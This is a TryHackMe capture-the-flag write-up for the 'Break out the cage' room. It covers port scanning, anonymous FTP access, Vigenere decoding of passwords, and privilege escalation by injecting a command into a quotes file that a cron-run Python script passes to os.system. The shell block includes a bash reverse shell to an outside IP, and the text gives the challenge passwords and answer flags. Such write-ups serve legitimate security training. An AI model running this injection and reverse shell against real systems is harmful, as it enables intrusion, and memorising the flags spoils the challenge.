# TryHackMe - Break out the cage

## 🛠 Setup

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.68.241
```

## 📌 Task 1: Investigate!

### 🔍 Nmap Scan

**Using all ports takes forver**

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)             
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                           
```
### 🔍 Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.68.241 -x .php,.txt,.html
```

**Results**
```
===============================================================                               
Starting gobuster in directory enumeration mode                                               
===============================================================                               
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 2453]
/images               (Status: 301) [Size: 313] [--> http://10.10.68.241/images/]
/html                 (Status: 301) [Size: 311] [--> http://10.10.68.241/html/]
/scripts              (Status: 301) [Size: 314] [--> http://10.10.68.241/scripts/]
/contracts            (Status: 301) [Size: 316] [--> http://10.10.68.241/contracts/]

```

Not much there. Let's see if there is anything on the FTP server

```bash
ftp anonymous@10.10.68.241
```

Yes, we have a connection and there is a file dad_tasks. We can pull that down with  get dad_tasks

```bash
get dad_tasks
```

### Weston's password?

The file is encrypted. Lets paste it into cyber chef and use the magic wand. that worked but still not english. It's a cypher

**Results**
```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

I like using the following website to try and determine which crypto being used. in this case 96 votes thinks it's a Vigenere Cipher

```
https://www.boxentriq.com/code-breaking/cipher-identifier
```
I searched for a good Vigenere Cipher and found this one.
```
https://www.guballa.de/vigenere-solver
```

**Results**

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

**Q. What is Weston's password?
A. Mydadisghostrideraintthatcoolnocausehesonfirejokes

### User Flag

now let's SSH into the box and grab the user file!

```bash
ssh weston@10.10.68.241
```
We're in but where is the user.txt flag file???

```bash
sudo -l
```
**Results**
```
[sudo] password for weston: 
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
```

I played around with bees and searched gtfobins but no dice. 
Lets keep looking
Let's have a look at other groups weston is in
```bash
id
```
**Results**
```
uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```

cage, that's a weird group. Let's see if groups gives us any more file permissions
```bash
find / -type f -group cage 2>/dev/null
```
**Results**
```
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
```
It looks like spread_the_quotes.py is running every 2 minutes. Perhaps we can swap out a quote for a shell script

**spread_the_quotes.py**
``` 
!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

oh. os.system is super easy to inject. All we need to do is end the wall string input with a ";" and then tell os.system to execute another file.

let's create the file and then update .quotes fr our injection

```bash
cat > /tmp/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.6.57.243/8888 0>&1
EOF
chmod +x /tmp/shell.sh
printf 'Cage is king;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
```

**Waiting...**

bam. we're in. Now we're cage

There is a private key in .ssh/rsa_id
Let's grab that just in case we get disconected. It also has no password so need to use john the ripper. We can log straight in!

Also there is a file called Super_Duper_Checklist
```bash
 cat Super_Duper_Checklist
 ```

 **Results**
 ```
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
 ```
**Q. What's the user flag?
A. THM{M37AL_0R_P3N_T35T1NG}

### Root Flag

I see a folder called email_backup. There are three files in there. cat each of them. The last one has the following

**Results**

```
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```

Looks like another cypher. I tried the same site as before but it didn't work. However, "face" seems to be a clue in the message.

Trying a new web site - using face as the key

```
https://www.boxentriq.com/code-breaking/vigenere-cipher
```

**Results**
```
cageisnotalegend
```
Root password!

```bash
su root
```

We're root Still no root.txt but there is another email-backup
Two email. The last one has the key!

'''
Sean Archer
root@national-treasure:~/email_backup# cat email_2
cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

Thank you

Sean Archer
'''

**Q. What's the root flag?
A. THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
